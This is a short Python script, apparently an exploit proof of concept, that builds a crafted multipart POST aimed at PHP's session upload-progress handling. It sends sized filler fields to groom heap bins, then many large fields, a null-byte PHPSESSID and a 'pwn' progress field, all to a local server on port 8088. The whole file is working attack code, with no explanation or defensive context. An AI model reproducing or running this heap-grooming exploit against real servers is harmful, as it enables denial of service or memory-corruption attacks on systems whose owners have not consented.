#!/usr/bin/env python3
"""Numeric-key OOM-in-cookie A.

usage: send_a_oomcookie3.py N_BIG BL FILLS
FILLS: "L:count,L:count" small fields sent BEFORE the big fields (to create and
fill specific bins), e.g. "39:32" = 32 fields with a 64-byte string.
Then N_BIG fields of BL bytes, then PHPSESSID=\\x00, PROGRESS, file part.
"""
import socket,sys
NB=int(sys.argv[1]); BL=int(sys.argv[2])
FILLS=[]
if len(sys.argv)>3 and sys.argv[3]:
    for spec in sys.argv[3].split(','):
        L,c=spec.split(':'); FILLS.append((int(L),int(c)))
BND=b'S'*17
parts=[]; idx=1000
for L,c in FILLS:
    for _ in range(c):
        parts.append({'name':str(idx),'data':b'F'*L}); idx+=1
for _ in range(NB):
    parts.append({'name':str(idx),'data':b'B'*BL}); idx+=1
parts.append({'name':'PHPSESSID','data':b'\x00'})
parts.append({'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'})
parts.append({'name':'f','filename':'a.txt','data':b'A'*64})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
    o+=p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=40); s.settimeout(40)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
